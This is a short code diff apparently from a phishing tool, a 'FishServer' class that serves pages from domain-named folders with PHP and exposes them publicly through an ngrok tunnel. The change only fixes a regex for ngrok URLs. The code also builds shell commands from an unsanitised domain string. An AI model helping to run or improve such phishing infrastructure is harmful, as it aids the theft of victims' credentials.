@@ -41,7 +41,7 @@ class FishServer():
 			os.system('cd ht/' + domain + ' && php -S localhost:8080 > tmp.txt 2>&1 &')
 			os.system('./ngrok http 8080 > bin/ngrok.log &')
 			time.sleep(8)
-			link = os.popen('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh').read()
+			link = os.popen('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z\-]*\.ngrok.io" -oh').read()
 			
 
 
